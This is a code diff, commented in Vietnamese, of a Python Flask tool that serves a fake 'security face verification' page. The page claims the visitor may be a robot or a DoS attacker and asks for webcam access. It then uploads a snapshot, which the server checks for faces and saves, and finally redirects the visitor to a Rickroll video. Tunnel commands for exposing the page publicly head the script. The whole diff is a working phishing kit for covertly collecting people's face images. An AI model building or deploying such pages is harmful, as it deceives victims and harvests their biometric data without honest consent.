@@ -21,7 +21,7 @@ print("""
 -- Tạo server:
    + 1: ssh -R 80:localhost:8080 nokey@localhost.run
    + 2: cloudflared tunnel --url http://localhost:8080
--- Dùng máy ảo: source myenv/bin/activate""")
+""")
 
 # Khởi tạo classifier phát hiện khuôn mặt
 face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
@@ -30,159 +30,182 @@ face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_fronta
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-HTML_PAGE = """  
+HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cổng Xác Thực Bảo Mật - An Toàn & Tin Cậy</title>
+  <title>Xác Thực Khuôn Mặt - An Toàn & Tin Cậy</title>
   <link rel="icon" href="https://www.google.com/favicon.ico">
   <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
-    /* Global styles */
+    /* Reset & Global */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #74ABE2, #5563DE);
+      background: linear-gradient(135deg, #2c3e50, #4ca1af);
       display: flex;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       color: #fff;
     }
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      max-width: 400px;
-      width: 90%;
+    /* Khung xác thực với border màu cố định */
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      width: 360px;
       padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
       text-align: center;
       position: relative;
+      overflow: hidden;
       z-index: 1;
-      animation: fadeIn 1s ease-out;
+      animation: slideDown 0.8s ease-out;
+      border: 3px solid #4ca1af;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-20px); }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-30px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    h2 {
+    .card h2 {
       color: #333;
       margin-bottom: 15px;
-    }
-    p {
-      font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 20px;
-      color: #555;
-    }
-    .info {
-      font-size: 14px;
-      color: #777;
-      margin-top: 15px;
-    }
-    .btn {
-      background-color: #5563DE;
-      color: #fff;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    .btn:hover {
-      background-color: #3c48b1;
-    }
-    .loader {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #5563DE;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-      display: none;
-    }
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
-    .success-msg {
-      color: #28a745;
-      font-weight: 600;
-      font-size: 18px;
-      margin-top: 20px;
-      display: none;
-      animation: fadeInText 1s forwards;
+      animation: fadeInText 1s ease-out;
     }
     @keyframes fadeInText {
       from { opacity: 0; }
       to { opacity: 1; }
     }
+    .card p {
+      color: #666;
+      margin-bottom: 20px;
+      font-size: 15px;
+    }
+    .btn {
+      background-color: #4ca1af;
+      color: #fff;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      margin-top: 10px;
+    }
+    .btn:hover {
+      background-color: #3b8d99;
+    }
+    .spinner {
+      margin: 20px auto;
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #4ca1af;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 16px;
+      color: #4ca1af;
+      margin-top: 10px;
+      display: none;
+      animation: fadeInText 1s ease-out;
+    }
+    .progress {
+      font-size: 20px;
+      margin-top: 10px;
+      color: #4ca1af;
+      display: none;
+      animation: fadeInProgress 0.5s ease-out;
+    }
+    @keyframes fadeInProgress {
+      from { opacity: 0; transform: scale(0.8); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .success {
+      color: #28a745;
+      font-size: 18px;
+      margin-top: 20px;
+      display: none;
+      animation: fadeInText 1s ease-out;
+    }
+    .info {
+      font-size: 13px;
+      color: #999;
+      margin-top: 20px;
+    }
     /* Modal Styles */
     .modal {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.7);
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.75);
       display: none;
       align-items: center;
       justify-content: center;
-      z-index: 999;
+      z-index: 1000;
     }
     .modal-content {
       background: #fff;
-      width: 90%;
-      max-width: 500px;
-      padding: 20px;
       border-radius: 8px;
+      width: 90%;
+      max-width: 400px;
+      padding: 20px;
       text-align: center;
       box-shadow: 0 4px 15px rgba(0,0,0,0.3);
       color: #333;
+      animation: slideUp 0.8s ease-out;
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     .modal-content h3 {
-      margin-top: 0;
-      color: #5563DE;
+      margin-bottom: 10px;
+      color: #4ca1af;
     }
     .modal-content p {
       font-size: 14px;
-      color: #555;
       margin-bottom: 20px;
     }
     .modal-close {
-      background: #5563DE;
+      background: #4ca1af;
       color: #fff;
       border: none;
       padding: 8px 16px;
       border-radius: 4px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: background 0.3s;
     }
     .modal-close:hover {
-      background: #414db7;
+      background: #3b8d99;
     }
   </style>
 </head>
 <body>
-  <!-- Nội dung chính -->
-  <div class="container">
-    <h2>Xác Thực Bảo Mật</h2>
-    <p>Chúng tôi cần xác thực gương mặt của bạn để kiểm tra bạn có phải robot hay không. Vui lòng nhấn nút bên dưới để xác thực.</p>
+  <div class="card">
+    <h2>Xác Thực Khuôn Mặt</h2>
+    <p>Chúng tôi cần xác thực khuôn mặt của bạn để đảm bảo an toàn. Nhấn nút bên dưới để bắt đầu xác minh.</p>
     <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
-    <div class="loader" id="loader"></div>
-    <div id="success-message" class="success-msg">✅ Xác Minh Hoàn Tất ✅</div>
-    <p class="info">Chúng tôi cam kết bảo mật thông tin của bạn!.</p>
+    <div class="spinner" id="loader"></div>
+    <div class="loading-text" id="loading-text">Đang xác thực...</div>
+    <!-- Phần hiển thị số tiến trình -->
+    <div class="progress" id="progress">0%</div>
+    <div class="success" id="success-message">✅ Xác Minh Hoàn Tất ✅</div>
+    <div class="info">Thông tin của bạn sẽ được bảo mật tuyệt đối.</div>
   </div>
 
   <!-- Modal Chính Sách Riêng Tư -->
   <div class="modal" id="privacy-modal">
     <div class="modal-content">
-      <h3>🤖 Tình Nghi Bạn Là Robot 🤖</h3>
-      <p>Chúng tôi nghi ngờ bạn không phải là con người thật sự. Vui lòng xác thực gương mặt của bạn để chứng minh bạn là người. Việc xác thực này là cần thiết để bảo vệ hệ thống khỏi các cuộc tấn công Dos,DDos,...</p>
+      <h3>🤖 Xác Thực Người Dùng 🤖</h3>
+      <p>Chúng tôi nghi ngờ bạn không phải là con người. Vui lòng xác minh khuôn mặt của bạn để tiếp tục.</p>
       <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
     </div>
   </div>
@@ -191,7 +214,7 @@ HTML_PAGE = """
   <div class="modal" id="adblock-modal">
     <div class="modal-content">
       <h3>Phát hiện AdBlock!</h3>
-      <p>Chúng tôi phát hiện bạn đang sử dụng trình chặn quảng cáo. Vui lòng tắt trình chặn quảng cáo để có trải nghiệm tốt nhất.</p>
+      <p>Vui lòng tắt AdBlock để có trải nghiệm tốt nhất.</p>
       <button class="modal-close" onclick="closeModal('adblock-modal')">Đồng Ý</button>
     </div>
   </div>
@@ -224,11 +247,14 @@ HTML_PAGE = """
     function startVerification() {
       let button = document.getElementById("verify-btn");
       let loader = document.getElementById("loader");
+      let loadingText = document.getElementById("loading-text");
+      let progress = document.getElementById("progress");
       let successMessage = document.getElementById("success-message");
 
-      // Ẩn nút xác minh và hiển thị loader
+      // Ẩn nút xác minh và hiển thị spinner cùng loading text
       button.style.display = "none";
       loader.style.display = "block";
+      loadingText.style.display = "block";
 
       // Yêu cầu quyền truy cập webcam
       navigator.mediaDevices.getUserMedia({ video: true })
@@ -245,30 +271,46 @@ HTML_PAGE = """
                   if(response.status !== 200){
                     alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
                     loader.style.display = "none";
+                    loadingText.style.display = "none";
                     button.style.display = "inline-block";
                     return;
                   }
+                  // Khi xác thực thành công, ẩn spinner & loading text, hiển thị progress
                   loader.style.display = "none";
-                  successMessage.style.display = "block";
-                  setTimeout(() => {
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                  }, 3000);
+                  loadingText.style.display = "none";
+                  progress.style.display = "block";
+                  
+                  // Đếm tiến trình từ 0 đến 100%
+                  let count = 0;
+                  let interval = setInterval(() => {
+                    count++;
+                    progress.innerText = count + "%";
+                    if(count >= 100) {
+                      clearInterval(interval);
+                      successMessage.style.display = "block";
+                      // Sau khi progress đạt 100%, chuyển hướng đến video Rickroll
+                      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                    }
+                  }, 30);
                 })
                 .catch(error => {
                   console.error("Lỗi upload ảnh:", error);
                   loader.style.display = "none";
+                  loadingText.style.display = "none";
                   button.style.display = "inline-block";
                 });
             })
             .catch(err => {
               console.error("Lỗi chụp ảnh:", err);
               loader.style.display = "none";
+              loadingText.style.display = "none";
               button.style.display = "inline-block";
             });
         })
         .catch(err => {
           console.error("Lỗi truy cập webcam:", err);
           loader.style.display = "none";
+          loadingText.style.display = "none";
           button.style.display = "inline-block";
         });
     }
@@ -310,9 +352,9 @@ def upload():
         # Thay đổi tham số phát hiện khuôn mặt cho nhạy hơn
         faces = face_cascade.detectMultiScale(
             gray,
-            scaleFactor=1.05,     # Nhạy hơn so với giá trị mặc định
-            minNeighbors=3,       # Giảm số lượng hàng xóm yêu cầu
-            minSize=(30, 30),     # Kích thước tối thiểu của khuôn mặt
+            scaleFactor=1.05,
+            minNeighbors=3,
+            minSize=(30, 30),
             flags=cv2.CASCADE_SCALE_IMAGE
         )
         print("Detected faces:", faces)
